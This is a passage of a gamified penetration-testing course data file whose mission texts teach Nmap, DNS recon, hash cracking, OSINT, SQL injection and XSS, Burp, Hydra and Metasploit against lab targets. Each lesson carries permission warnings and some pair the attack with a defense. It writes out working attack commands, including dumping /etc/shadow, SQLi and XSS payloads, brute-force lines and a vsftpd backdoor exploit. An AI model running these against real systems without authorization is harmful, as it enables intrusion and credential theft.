Every open port is a door. Your job is to find them all.

━━ OBJECTIVE ━━
Master Nmap: discovery, port scanning, version detection, NSE scripts,
and output formats. Understand how timing affects stealth.

━━ WHY IT MATTERS ━━
Nmap is the industry-standard network scanner. It appears in every
pentest methodology, OSCP exam, and CompTIA CySA+ scenario. Security+
tests knowledge of network scanning and enumeration.

━━ HACKER MINDSET ━━
Speed vs stealth is the constant tradeoff. A fast -T5 scan will trigger
every IDS on the planet. A slow -T1 scan takes hours but whispers past
detection. Professional pentesters choose based on their rules of engagement.

⚠️ ONLY scan machines YOU own or have written permission to test.

━━ QUEST ━━
Step 1 — Discovery (find live hosts):
  nmap -sn 192.168.1.0/24      → Ping sweep (no port scan)
  nmap -sn 10.0.0.0/8          → Large subnet sweep

Step 2 — Port scanning:
  nmap TARGET                   → Top 1000 ports (fast default)
  nmap -p- TARGET               → ALL 65535 ports (slow but thorough)
  nmap -p 22,80,443,8080 TARGET → Specific ports only
  nmap -p 1-1024 TARGET         → Port range

Step 3 — Scan types:
  -sS   SYN stealth (default, fast, less logged)
  -sT   Full TCP connect (slower, more reliably detected)
  -sU   UDP scan (slow — DNS, SNMP, DHCP live here)
  -sV   Version detection (what software + version?)
  -sC   Default NSE scripts (runs safe enumeration)
  -O    OS detection (guesses OS from TCP/IP behavior)
  -A    Aggressive: -sV -sC -O combined

Step 4 — NSE Scripts (the superpower):
  nmap --script=default TARGET           → Safe general scripts
  nmap --script=vuln TARGET              → Known vulnerability checks
  nmap --script=http-enum TARGET         → Web directory enumeration
  nmap --script=smb-vuln-ms17-010 TARGET → Check for EternalBlue
  ls /usr/share/nmap/scripts/            → Browse all ~600 scripts

Step 5 — Output (always save your scans):
  -oN scan.txt    → Human-readable
  -oX scan.xml    → XML (for import into other tools)
  -oG scan.gnmap  → Grepable format
  -oA prefix      → All three formats at once

Step 6 — Timing and stealth:
  -T0   Paranoid  (slowest, IDS evasion)
  -T1   Sneaky
  -T3   Normal    (default)
  -T5   Insane    (fastest, very noisy)
  --max-rate 10   → Limit to 10 packets/second

━━ NEXT LOCATION ━━
DNS Deep Dive (net04) — DNS is passive recon gold.
You can map an entire organization's infrastructure without ever
touching their servers directly.
""",
    },

    {
        "id": "net04", "tree": "networking", "tier": 3, "xp": 55,
        "title": "DNS Deep Dive",
        "brief": "Enumerate DNS. Map the target without touching it.",
        "bonus": "Full DNS recon on a domain you own: A/MX/NS/TXT/zone transfer attempt/SPF/DMARC. ~/dns_recon.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Domain Intelligence Bureau ══╗
DNS is the phone book of the internet.
And most organizations leave it wide open.
A zone transfer can hand you their entire internal map —
servers, mail systems, VPNs, internal hostnames — all without
a single scan touching their network.

━━ OBJECTIVE ━━
Master DNS record types, enumeration tools, and zone transfer attacks.
Learn to identify email security misconfigurations (SPF/DMARC).

━━ WHY IT MATTERS ━━
DNS reconnaissance is passive — it doesn't touch the target directly.
It's how pentesters map attack surfaces before active scanning.
Security+ covers DNS security, zone transfers, and email authentication.

━━ HACKER MINDSET ━━
Zone transfers (AXFR) are misconfigured DNS servers handing you
the entire zone file — every hostname and IP in the organization.
It's like the building manager handing you the master key list
because you asked nicely.

⚠️ Use domains YOU own or have permission to test.

━━ QUEST ━━
Step 1 — Basic DNS lookups:
  dig example.com A        → IPv4 address
  dig example.com AAAA     → IPv6 address
  dig example.com MX       → Mail servers (who handles email?)
  dig example.com NS       → Name servers (who controls DNS?)
  dig example.com TXT      → Text records (SPF, DMARC, verification)
  dig example.com SOA      → Start of Authority (admin info)
  dig -x 93.184.216.34     → Reverse lookup (IP → hostname)
  nslookup example.com     → Simpler alternative

Step 2 — Zone Transfer (the gold mine):
  dig axfr @ns1.example.com example.com
  # If misconfigured: you get EVERY record in the zone
  # This is CVE-class misconfig — should always be refused

Step 3 — Automated enumeration:
  dnsrecon -d example.com -t std      → Standard recon
  dnsrecon -d example.com -t axfr     → Zone transfer attempt
  dnsenum example.com                  → Brute-force subdomains
  fierce --domain example.com          → Aggressive subdomain hunt

Step 4 — Email security (TXT records):
  dig example.com TXT | grep spf      → SPF record (who can send email?)
  dig _dmarc.example.com TXT          → DMARC policy
  dig default._domainkey.example.com TXT → DKIM signing key

  If SPF/DMARC are missing → email spoofing is possible!
  (This is how phishing campaigns succeed)

Step 5 — What to do with subdomains:
  Each subdomain is a potential attack surface:
  mail.example.com  → Email server
  vpn.example.com   → VPN gateway
  dev.example.com   → Development server (often less hardened)
  staging.example.com → Staging server (often has debug features on)

━━ NEXT LOCATION ━━
The networking tree is complete. Branch to Recon & OSINT (rc01)
to combine passive intel gathering into a full pre-attack picture.
Or pivot to Web Hacking (web01) to start attacking what you've found.
""",
    },


    # ══════════════════════════════════════════════════════
    # CRYPTOGRAPHY
    # ══════════════════════════════════════════════════════

    {
        "id": "cr01", "tree": "crypto", "tier": 1, "xp": 25,
        "title": "CIA & Crypto Basics",
        "brief": "CIA Triad, hashing, encoding, encryption. Know the difference.",
        "bonus": "Hash a file, modify one byte, hash again. Encrypt/decrypt with openssl. ~/crypto_lab.txt",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Cipher Chamber ══╗
Three words protect everything in security: Confidentiality, Integrity, Availability.
Every control, every tool, every policy maps back to one of these.
Today you learn the foundation. Everything else builds on this.

━━ OBJECTIVE ━━
Understand the CIA Triad, the difference between hashing/encoding/encryption,
symmetric vs asymmetric crypto, and how to use openssl for hands-on practice.

━━ WHY IT MATTERS ━━
The CIA Triad is the most fundamental concept in CompTIA Security+.
Every exam question maps to one of these three properties.
Understanding cryptographic primitives is required for every security role.

━━ HACKER MINDSET ━━
Attackers target whichever part of CIA is weakest:
  Steal data from unencrypted databases → Confidentiality failure
  Tamper with files without being detected → Integrity failure
  Crash services with DDoS → Availability failure
Defenders build controls that protect all three simultaneously.

━━ QUEST ━━
Step 1 — The CIA Triad:
  C — CONFIDENTIALITY: Only authorized parties can access data
      → Controls: encryption, MFA, access controls, need-to-know
  I — INTEGRITY: Data hasn't been tampered with
      → Controls: hashing, digital signatures, checksums, WORM storage
  A — AVAILABILITY: Systems work when needed
      → Controls: redundancy, backups, DDoS mitigation, SLAs

Step 2 — Hashing (one-way, integrity checking):
  echo -n "password123" | md5sum        → MD5 (weak, still seen)
  echo -n "password123" | sha256sum     → SHA-256 (strong)
  echo -n "password123" | sha512sum     → SHA-512 (stronger)
  sha256sum /usr/bin/ls                 → File integrity check
  # Same input ALWAYS produces same hash
  # Change ONE bit → completely different hash (avalanche effect)

Step 3 — Encoding (NOT security — just format conversion):
  echo -n "hello" | base64             → aGVsbG8=
  echo -n "aGVsbG8=" | base64 -d       → hello
  # Base64 is NOT encryption — anyone can decode it instantly

Step 4 — Symmetric encryption (one key):
  openssl enc -aes-256-cbc -salt -in secret.txt -out encrypted.bin
  openssl enc -aes-256-cbc -d -in encrypted.bin -out decrypted.txt
  # AES-256 — industry standard. Used in VPNs, HTTPS, disk encryption.

Step 5 — Asymmetric encryption (key pair):
  openssl genrsa -out private.pem 2048         → Generate private key
  openssl rsa -in private.pem -pubout -out public.pem → Extract public key
  echo "TOP SECRET" > msg.txt
  openssl rsautl -encrypt -pubin -inkey public.pem -in msg.txt -out msg.enc
  openssl rsautl -decrypt -inkey private.pem -in msg.enc
  # RSA: encrypt with public, decrypt with private
  # Used in: HTTPS, SSH keys, email signing (PGP)

━━ NEXT LOCATION ━━
Hash Cracking Lab (cr02) — now that you know what hashes are,
let's see how attackers crack them.
""",
    },

    {
        "id": "cr02", "tree": "crypto", "tier": 2, "xp": 40,
        "title": "Hash Cracking Lab",
        "brief": "Crack password hashes with John and hashcat. Then defend against it.",
        "bonus": "Create 5 test accounts with different password strengths. Crack with John. Time each. Document results.",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Password Cracking Rig ══╗
14 million real passwords. One file. rockyou.txt.
These are passwords from a real breach. People reuse them.
John the Ripper and hashcat turn those 14 million entries
into a wall of cracked hashes in minutes. Here's how.

━━ OBJECTIVE ━━
Use John the Ripper and hashcat to crack password hashes.
Understand wordlists, hash types, and attack modes.
Implement defenses that make cracking computationally infeasible.

━━ WHY IT MATTERS ━━
Password attacks are among the most common intrusion methods.
Security+ tests credential security, password policies, and
multi-factor authentication as compensating controls.

━━ HACKER MINDSET ━━
Offline hash cracking happens AFTER an attacker has already dumped
the database. You're not connecting to anything — you're running
math against a local file. The goal: crack enough hashes to
move laterally or escalate. Speed matters. GPU > CPU.

⚠️ ONLY crack hashes YOU own or have permission to test.

━━ QUEST ━━
Step 1 — Hash types (know them by sight):
  $1$   = MD5crypt      (very weak, crack in seconds)
  $5$   = SHA-256crypt  (moderate)
  $6$   = SHA-512crypt  (better — Linux default)
  $y$   = yescrypt      (strong — modern Linux)
  $2b$  = bcrypt        (strong — designed to be slow)
  2000: = PBKDF2        (strong — designed to be slow)

Step 2 — Set up rockyou:
  ls /usr/share/wordlists/
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz    # (if needed)
  wc -l /usr/share/wordlists/rockyou.txt             # ~14.3 million

Step 3 — John the Ripper:
  # Extract hashes from system (requires root):
  sudo unshadow /etc/passwd /etc/shadow > ~/hashes.txt
  cat ~/hashes.txt                      # See the hash format
  john --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes.txt
  john --show ~/hashes.txt              # Show cracked passwords
  john --rules ~/hashes.txt             # Try mutation rules
  john --format=sha512crypt ~/hashes.txt # Specify hash type

Step 4 — hashcat (GPU-accelerated):
  hashcat -m 1800 -a 0 hash.txt rockyou.txt     # SHA-512crypt dict
  hashcat -m 0    -a 0 hash.txt rockyou.txt     # MD5 dict
  hashcat -m 1000 -a 0 hash.txt rockyou.txt     # NTLM (Windows)
  hashcat -m 1800 -a 3 hash.txt ?a?a?a?a?a?a   # 6-char brute force
  # -m = hash type | -a 0 = dictionary | -a 3 = brute force

Step 5 — Defend against cracking:
  Use bcrypt or argon2 (adaptive, slow by design)
  Enforce 16+ character passphrases
  Per-user salts (prevents rainbow table attacks)
  Account lockout + MFA (stops online attacks)
  Never store MD5 or SHA1 hashes — they're broken.

━━ NEXT LOCATION ━━
You've built cryptographic intuition. Now move to Web Hacking (web01)
or Recon (rc01) to apply these skills to real attack chains.
""",
    },


    # ══════════════════════════════════════════════════════
    # RECON & OSINT
    # ══════════════════════════════════════════════════════

    {
        "id": "rc01", "tree": "recon", "tier": 1, "xp": 25,
        "title": "Self Scanner",
        "brief": "See yourself through the attacker's eyes. Know your own surface.",
        "bonus": "For each open port: service name, version, default creds check. ~/self_assessment.txt",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Reconnaissance Dojo ══╗
Before attacking anyone else, you need to understand
what an attacker sees when they look at YOUR machine.
This is the first rule of defense: know your own attack surface.

━━ OBJECTIVE ━━
Run a self-assessment. Document every service, every open port,
every externally-visible piece of your lab machine.

━━ WHY IT MATTERS ━━
You cannot defend what you don't know exists. Self-scanning is the
first step in vulnerability management — a Security+ core concept.
It's also the first thing a pentester does after landing on a host.

━━ HACKER MINDSET ━━
A newly compromised host gets enumerated immediately:
ip a → ss -tulnp → nmap localhost → check sudo → check cron.
In under 2 minutes, an attacker knows exactly what's running.
Defenders should run this same check regularly.

━━ QUEST ━━
Step 1 — Network identity:
  ip a                  → All interfaces and IPs
  ip route              → Gateway and routes
  curl ifconfig.me      → Your PUBLIC IP (what the internet sees)
  hostname              → Machine name
  cat /etc/hosts        → Local hostname mappings

Step 2 — What's listening?
  ss -tulnp             → Open TCP/UDP ports + which process
  netstat -tulnp        → Same (older command)
  # For EACH port ask:
  # - Do I need this service?
  # - Is it up to date?  (dpkg -l | grep service-name)
  # - Is it firewalled from external access?

Step 3 — Scan yourself like an outsider:
  nmap -sV localhost    → Service versions on your own machine
  nmap -sV -sC localhost → With default scripts (more detailed)
  nmap --script=vuln localhost → Check for known vulnerabilities!
  nikto -h http://localhost → Web server vulnerability scan

Step 4 — Document your surface:
  echo "=== Self-Assessment $(date) ===" > ~/self_assessment.txt
  ip a >> ~/self_assessment.txt
  ss -tulnp >> ~/self_assessment.txt
  nmap -sV localhost >> ~/self_assessment.txt

━━ NEXT LOCATION ━━
You know your own surface. OSINT Operator (rc02) teaches you to
gather intelligence on external targets — passively, legally,
and devastatingly effectively.
""",
    },

    {
        "id": "rc02", "tree": "recon", "tier": 2, "xp": 45,
        "title": "OSINT Operator",
        "brief": "Gather target intelligence from public sources. No touching required.",
        "bonus": "Full OSINT on a domain you own: DNS/WHOIS/emails/subdomains/tech stack. ~/osint_report.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Intelligence Gathering Station ══╗
The best recon doesn't touch the target.
You can map an entire organization from public sources —
their employees, their technology, their email infrastructure,
their forgotten subdomains — before you've run a single scan.

━━ OBJECTIVE ━━
Use WHOIS, DNS tools, Google dorks, theHarvester, and Shodan
to build a complete picture of a target from public sources only.

━━ WHY IT MATTERS ━━
OSINT is legal, passive, and extraordinarily powerful. Professional
red teams spend days in this phase. Missing publicly exposed assets
is a common failure in real security programs.

━━ HACKER MINDSET ━━
Your attack plan lives in public data. A company's job postings
reveal their tech stack. LinkedIn shows you their org chart.
DNS reveals their infrastructure. Shodan shows their exposed services.
All of this before you've sent a single packet to their network.

⚠️ Only enumerate domains/targets you own or have permission for.

━━ QUEST ━━
Step 1 — WHOIS and registration info:
  whois example.com          → Registrar, dates, name servers, contacts
  whois 93.184.216.34        → IP ownership (who runs this IP?)

Step 2 — DNS enumeration:
  dig example.com ANY         → All DNS records
  dnsrecon -d example.com -t std
  fierce --domain example.com  → Subdomain brute force

Step 3 — Email and employee discovery:
  theHarvester -d example.com -l 200 -b google
  theHarvester -d example.com -l 200 -b linkedin
  theHarvester -d example.com -l 200 -b all
  # Finds: email addresses, names, subdomains, IPs

Step 4 — Google Dorking:
  site:example.com                          → All indexed pages
  site:example.com filetype:pdf            → PDF documents
  site:example.com inurl:admin              → Admin panels
  site:example.com intitle:"index of"      → Open directories
  "example.com" "password" filetype:txt    → Credential leaks?

Step 5 — Technology fingerprinting:
  whatweb http://example.com              → Server/CMS/framework
  curl -I http://example.com | grep -i server → Web server header
  wappalyzer (browser extension)          → Full tech stack

Step 6 — Shodan (the search engine for exposed devices):
  # https://shodan.io
  Search: hostname:example.com
  Search: org:"Company Name"
  # Finds: exposed web servers, RDP, SSH, cameras, printers

━━ NEXT LOCATION ━━
Intelligence gathered. Now you strike. Web Recon (web01) applies
this intelligence to web application targets specifically.
""",
    },


    # ══════════════════════════════════════════════════════
    # WEB HACKING
    # ══════════════════════════════════════════════════════

    {
        "id": "web01", "tree": "webhack", "tier": 1, "xp": 25,
        "title": "Web Recon",
        "brief": "Enumerate web servers, hidden directories, and tech fingerprints.",
        "bonus": "Set up DVWA. Run full web recon. Document every finding in ~/web_recon.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Web Infiltration Staging Area ══╗
Before you inject, before you exploit, you map.
Every web application has a surface:
directories, parameters, technologies, headers.
Your job is to read it all before the target knows you're there.

⚠️ ONLY use against YOUR lab targets (DVWA, Juice Shop, Metasploitable).

━━ OBJECTIVE ━━
Enumerate web servers using manual techniques and automated tools.
Discover hidden directories, identify technologies, and analyze headers.

━━ WHY IT MATTERS ━━
Web application security is the largest attack category in real-world
breaches. OWASP Top 10 is CompTIA Security+ exam material.
Web recon is Phase 1 of every web application pentest.

━━ HACKER MINDSET ━━
robots.txt tells search engines what NOT to index — which means it's
a map of your most sensitive paths. Developers leave admin panels,
backup files, and .git repositories exposed constantly.
Your enumeration finds what they forgot.

━━ QUEST ━━
Step 1 — HTTP basics with curl:
  curl http://TARGET                         → Get the homepage
  curl -I http://TARGET                      → Headers only (server, tech)
  curl -v http://TARGET                      → Verbose (see full request/response)
  curl http://TARGET/robots.txt             → See what they're hiding!
  curl http://TARGET/sitemap.xml            → Site structure

Step 2 — Common files to check manually:
  /robots.txt    /sitemap.xml   /.git/       /admin/
  /backup/       /config.php   /wp-admin/   /.env
  /phpinfo.php   /login        /.htaccess   /api/

Step 3 — Directory brute-forcing:
  gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
  gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  dirb http://TARGET                         → Older but reliable alternative

Step 4 — Technology fingerprinting:
  whatweb http://TARGET                      → Server, CMS, frameworks, plugins
  curl -I http://TARGET | grep -Ei 'server|x-powered|x-generator'
  # Look for: Apache, nginx, PHP version, WordPress, ASP.NET

Step 5 — SSL/TLS analysis:
  echo | openssl s_client -connect TARGET:443 2>/dev/null | openssl x509 -text
  # Check: expiry date, issuer, SANs (reveals other hostnames!)
  sslscan TARGET:443                         → Full TLS analysis

━━ NEXT LOCATION ━━
Directories mapped. Now Injection Master (web02) —
SQL injection and XSS are waiting in those parameters you just found.
""",
    },

    {
        "id": "web02", "tree": "webhack", "tier": 2, "xp": 50,
        "title": "Injection Master",
        "brief": "SQL injection, XSS, OWASP Top 10. Attack the inputs.",
        "bonus": "DVWA: SQLi to dump users, reflected XSS, stored XSS. Document attack + fix for each. ~/injection_lab.txt",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Injection Chamber ══╗
Every input field is a potential doorway.
The database trusts whatever the web app sends it.
If you control the input, you control the query.
SQL injection has compromised governments, banks, and Fortune 500s.
Here's how it works — and how to stop it.

⚠️ ONLY on YOUR lab targets (DVWA set to LOW security, Juice Shop).

━━ OBJECTIVE ━━
Perform SQL injection and Cross-Site Scripting (XSS) attacks.
Understand the OWASP Top 10 categories. Implement defenses.

━━ WHY IT MATTERS ━━
Injection has been #1 on the OWASP Top 10 for years. Broken Access
Control took the top spot in 2021 but injection remains critical.
CompTIA Security+ specifically tests injection attack types.

━━ HACKER MINDSET ━━
The application passes your input directly to the database.
If you add SQL syntax, the database interprets it as a command.
It's not a bug in your code — it's a failure to separate
data from instructions. That distinction is the security control.

━━ QUEST ━━
Step 1 — How SQL injection works:
  Normal query: SELECT * FROM users WHERE id = '1'
  Your input:   1' OR '1'='1
  Result:       SELECT * FROM users WHERE id = '1' OR '1'='1'
                → Returns ALL users (condition always true)

  Login bypass: Username: admin'--
  Result:       SELECT * FROM users WHERE name='admin'--' AND pass='...'
                → The -- comments out the password check!

Step 2 — Manual SQLi testing (in DVWA):
  # In any input field, try:
  '            → Error means the input hits the DB unescaped
  1' OR 1=1 -- → Returns all rows
  1' UNION SELECT 1,2,3 -- → Test for UNION injection
  1' UNION SELECT table_name,2 FROM information_schema.tables --

Step 3 — Automated SQLi with sqlmap:
  sqlmap -u "http://DVWA/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=..." --batch
  sqlmap -u "URL?id=1" --batch --dbs           → List databases
  sqlmap -u "URL?id=1" --batch -D dvwa --tables → List tables
  sqlmap -u "URL?id=1" --batch -D dvwa -T users --dump → Dump table

Step 4 — XSS (Cross-Site Scripting):
  In any text field, try:
  <script>alert('XSS')</script>            → Basic reflected XSS
  <img src=x onerror=alert('XSS')>        → Image error event
  <svg onload=alert('XSS')>               → SVG event
  # If the popup appears → XSS is confirmed
  # Stored XSS: payload saved in DB, triggers for every visitor

Step 5 — OWASP Top 10 (2021):
  A01: Broken Access Control    A02: Cryptographic Failures
  A03: Injection                A04: Insecure Design
  A05: Security Misconfiguration A06: Vulnerable/Outdated Components
  A07: Auth/Session Failures    A08: Data Integrity Failures
  A09: Logging/Monitoring Failures  A10: SSRF

Step 6 — Defense:
  SQLi fix: Parameterized queries / prepared statements
  XSS fix: Output encoding, Content Security Policy (CSP) headers
  Never trust user input. Validate server-side, encode on output.

━━ NEXT LOCATION ━━
Burp Suite Operator (web03) — put an intercepting proxy between you
and the application. Modify requests in real time. Automate attacks.
""",
    },

    {
        "id": "web03", "tree": "webhack", "tier": 3, "xp": 60,
        "title": "Burp Suite Operator",
        "brief": "Intercept, modify, and attack web traffic with the industry standard.",
        "bonus": "DVWA: intercept login in Proxy, modify in Repeater, brute force with Intruder. ~/burp_lab.txt",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Interception Suite ══╗
Every request between browser and server passes through your hands.
Burp Suite is the man-in-the-middle tool every professional uses.
It's required knowledge for OSCP, OSWE, and every web security cert.

⚠️ ONLY against your own lab targets.

━━ OBJECTIVE ━━
Configure Burp Suite as an intercepting proxy. Use Proxy, Repeater,
Intruder, and Decoder modules to intercept and manipulate web traffic.

━━ WHY IT MATTERS ━━
Burp Suite is THE industry standard for web application pentesting.
Every professional uses it daily. Security+ tests web proxy concepts
and understanding of HTTP request/response manipulation.

━━ HACKER MINDSET ━━
The browser shows you what the server WANTS you to see.
Burp shows you what's ACTUALLY being sent and received.
Hidden form fields, JWT tokens, session cookies, API endpoints —
all visible and modifiable the moment you're proxied.

━━ QUEST ━━
Step 1 — Setup:
  burpsuite &                          → Launch Burp
  Settings → Network → Connections → Proxy Listeners → 127.0.0.1:8080
  Browser: set proxy to 127.0.0.1:8080
  Visit http://burpsuite → Download and install CA certificate → Import to browser

Step 2 — Proxy (intercept and inspect):
  Turn Intercept ON → browse to DVWA login page
  Watch every request appear in Burp
  Inspect: cookies, headers, POST body parameters
  Forward or Drop each request
  Look for: session tokens, hidden fields, API calls

Step 3 — Repeater (modify and resend):
  Right-click any request → Send to Repeater
  Modify parameters, cookies, headers
  Click Send → see the response immediately
  Great for: manual injection testing, parameter manipulation

Step 4 — Intruder (automated attacks):
  Right-click request → Send to Intruder
  Mark attack positions with § symbols (e.g., the password field)
  Payloads tab → load rockyou.txt
  Attack! → Watch response lengths for anomalies
  Attack types:
    Sniper       → One position, one wordlist
    Battering Ram → All positions, same payload
    Pitchfork    → Multiple positions, separate wordlists
    Cluster Bomb → All combinations (use sparingly — combinatorial explosion)

Step 5 — Decoder (encode/decode manually):
  Paste value → Decode as URL / Base64 / HTML
  Encode your payloads before testing
  Useful for: decoding JWT tokens, URL-encoded payloads

━━ NEXT LOCATION ━━
Web hacking tree complete. Move to Password Attacks (pw01) or
Exploitation (ex01) to push from web access deeper into the system.
""",
    },


    # ══════════════════════════════════════════════════════
    # PASSWORD ATTACKS
    # ══════════════════════════════════════════════════════

    {
        "id": "pw01", "tree": "passwords", "tier": 1, "xp": 25,
        "title": "Password Theory",
        "brief": "Storage, attack vectors, and wordlists. Know the enemy.",
        "bonus": "Build 3 wordlists: CeWL from a site, crunch for PINs, manual common list. ~/wordlists/",
        "bonus_xp": 10,
        "mission": """\
╔══ LOCATION: The Credential Intelligence Briefing ══╗
Passwords are the weakest link in nearly every system.
Before you crack, you need to understand how they're stored,
why certain attacks work, and how defenders should respond.

━━ OBJECTIVE ━━
Understand password storage, attack types, and wordlist construction.
Build custom wordlists for targeted attacks.

━━ WHY IT MATTERS ━━
Password attacks are the #1 initial access vector in breaches.
CompTIA Security+ tests password attacks, account lockout policies,
and multi-factor authentication as compensating controls.

━━ HACKER MINDSET ━━
Targeted wordlists beat generic ones. If you're attacking a company,
CeWL builds a wordlist from their website using real words their employees
might use as passwords. Crunch generates patterns for PINs and known formats.
Custom beats random every time.

━━ QUEST ━━
Step 1 — How Linux stores passwords:
  /etc/passwd  → User info (readable by everyone)
  /etc/shadow  → Password hashes (root only — this is what we crack)
  Format: user:$type$salt$hash:last_change:min:max:warn:inactive:expire

Step 2 — Password attack types:
  Dictionary   → Try words from a wordlist (fast, covers common passwords)
  Brute Force  → Try every possible combination (slow, but exhaustive)
  Rule-Based   → Apply mutations to dictionary words (password → P@ssw0rd)
  Rainbow Table → Pre-computed hash → plaintext lookup (defeated by salts)
  Credential Stuffing → Use leaked creds from one breach on other services

Step 3 — Available wordlists on Parrot:
  ls /usr/share/wordlists/
  rockyou.txt               → 14.3 million real passwords from a 2009 breach
  /usr/share/wordlists/dirb/common.txt → Web directories
  /usr/share/wordlists/dirbuster/      → More web dirs

Step 4 — Generate custom wordlists:
  # CeWL — spider a website and build a wordlist from its words:
  cewl http://target -w ~/wordlists/cewl_target.txt
  cewl http://target -d 3 -m 6 -w ~/wordlists/cewl_deep.txt
  # -d 3 = crawl 3 levels deep | -m 6 = minimum 6 chars

  # crunch — generate by pattern:
  crunch 6 6 0123456789 -o ~/wordlists/6digit_pins.txt   → All 6-digit PINs
  crunch 8 8 -t Company@@ -o ~/wordlists/company.txt      → Company + 2 digits

━━ NEXT LOCATION ━━
Crack & Defend (pw02) — take these wordlists and put them to work
against real hashes. Then build the defenses that stop it.
""",
    },

    {
        "id": "pw02", "tree": "passwords", "tier": 2, "xp": 45,
        "title": "Crack & Defend",
        "brief": "Crack SSH and web forms with Hydra. Deploy fail2ban to stop it.",
        "bonus": "Full cycle: deploy fail2ban, run Hydra against your own SSH, verify the ban in logs. ~/password_defense.txt",
        "bonus_xp": 15,
        "mission": """\
╔══ LOCATION: The Dual Operations Room ══╗
Attack and defense are the same knowledge — different intent.
You're going to crack live services, then lock them down.
This is the only way to truly understand what you're protecting.

⚠️ ONLY attack YOUR OWN systems.

━━ OBJECTIVE ━━
Perform offline hash cracking with John and online service attacks
with Hydra. Deploy fail2ban to detect and block brute force attacks.

━━ WHY IT MATTERS ━━
Understanding both the attack and the defense makes you a vastly
better security professional. Security+ expects knowledge of
both password attacks and account lockout / MFA countermeasures.

━━ HACKER MINDSET ━━
The attacker's goal: crack enough passwords to move laterally.
The defender's goal: make cracking computationally infeasible
and detect online brute force attempts before they succeed.
Fail2ban bridges both worlds — it's your IDS-lite for SSH.

━━ QUEST ━━
Step 1 — Offline cracking with John:
  sudo unshadow /etc/passwd /etc/shadow > ~/hashes.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt ~/hashes.txt
  john --show ~/hashes.txt
  john --rules ~/hashes.txt              → Rule-based mutations
  john --incremental ~/hashes.txt        → Brute force all combos

Step 2 — Online attacks with Hydra:
  # SSH brute force (against YOUR OWN machine):
  hydra -l captain -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -t 4
  # -l = username | -P = password list | -t = parallel threads

  # Web form brute force:
  hydra -l admin -P rockyou.txt http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid credentials"

  # FTP:
  hydra -l admin -P rockyou.txt ftp://TARGET

Step 3 — Deploy fail2ban (the defender's response):
  sudo apt install fail2ban
  sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
  sudo nano /etc/fail2ban/jail.local
    # Under [sshd]:
    enabled  = true
    port     = ssh
    maxretry = 3
    bantime  = 3600
    findtime = 600
  sudo systemctl enable --now fail2ban

Step 4 — Test and verify the ban:
  # Run Hydra against your own SSH again
  # Watch fail2ban react:
  sudo fail2ban-client status sshd
  sudo tail -f /var/log/fail2ban.log
  # You should see the IP get banned after maxretry failures

Step 5 — Check from the banned IP's perspective:
  ssh captain@127.0.0.1    → "Connection refused" — the ban works!
  sudo fail2ban-client set sshd unbanip 127.0.0.1  → Unban yourself

━━ NEXT LOCATION ━━
Passwords cracked, defenses built. Metasploit Academy (ex01) takes
all of this knowledge and chains it into a full exploitation workflow.
""",
    },


    # ══════════════════════════════════════════════════════
    # EXPLOITATION
    # ══════════════════════════════════════════════════════

    {
        "id": "ex01", "tree": "exploit", "tier": 2, "xp": 45,
        "title": "Metasploit Academy",
        "brief": "The exploitation framework. Find it, load it, own it.",
        "bonus": "Set up Metasploitable 2. Scan with nmap, exploit one service, document the full chain. ~/msf_lab.txt",
        "bonus_xp": 20,
        "mission": """\
╔══ LOCATION: The Exploit Laboratory ══╗
Metasploit is the Swiss Army knife of exploitation.
Hundreds of exploits, payloads, and post-exploitation modules —
all organized, documented, and ready to deploy.
This is where recon becomes access.

⚠️ ONLY use against machines YOU own or have written permission for.

━━ OBJECTIVE ━━
Navigate the Metasploit Framework. Select exploits, configure payloads,
gain shells, and use post-exploitation Meterpreter commands.

━━ WHY IT MATTERS ━━
Metasploit is THE industry standard exploitation framework. OSCP,
CEH, and CySA+ all reference it. Understanding it is required
for both offensive and defensive roles (defenders write detection
rules for Metasploit signatures).

━━ HACKER MINDSET ━━
Metasploit doesn't find the vulnerability — nmap and recon do.
Metasploit weaponizes what you've already found. The workflow:
recon → identify service + version → searchsploit → use module →
configure options → exploit → post-exploitation.

━━ QUEST ━━
Step 1 — Initialize and launch:
  sudo msfdb init                     → Initialize the database
  msfconsole                          → Launch (takes a moment)

Step 2 — Navigate the framework:
  help                                → All commands
  search type:exploit platform:linux  → Find Linux exploits
  search vsftpd                       → Search by name
  search cve:2017-0144                → Search by CVE (EternalBlue!)

Step 3 — Load and configure an exploit:
  use exploit/unix/ftp/vsftpd_234_backdoor
  show options                        → What needs to be set?
  set RHOSTS 192.168.1.100            → Target IP
  set RPORT 21                        → Target port
  show payloads                       → Available payloads for this exploit
  set PAYLOAD cmd/unix/interact       → Set the payload
  run                                 → Fire!

Step 4 — Meterpreter (advanced shell):
  If you get a Meterpreter session:
  sysinfo           → Target OS and architecture
  getuid            → Current user on target
  getpid            → Current process ID
  ps                → Running processes
  shell             → Drop to native OS shell
  hashdump          → Dump password hashes (if root)
  download /etc/shadow → Download a file
  upload ~/tool.sh /tmp/ → Upload a file
  bg                → Background the session
  sessions -l       → List all sessions
  sessions -i 1     → Interact with session 1

Step 5 — Auxiliary modules (no exploit, just information):
  use auxiliary/scanner/portscan/tcp
  use auxiliary/scanner/smb/smb_version
  use auxiliary/scanner/ssh/ssh_login
  use auxiliary/scanner/http/http_version

━━ NEXT LOCATION ━━
You have a shell. Privilege Escalation (ex02) — now go from user to root.
""",
    },

    {
        "id": "ex02", "tree": "exploit", "tier": 3, "xp": 60,
        "title": "Privilege Escalation",
        "brief": "User shell to root. Enumerate, exploit, escalate.",
        "bonus": "Run linpeas.sh on your Parrot box. Fix 2 real issues. Document before/after. ~/privesc_audit.txt",
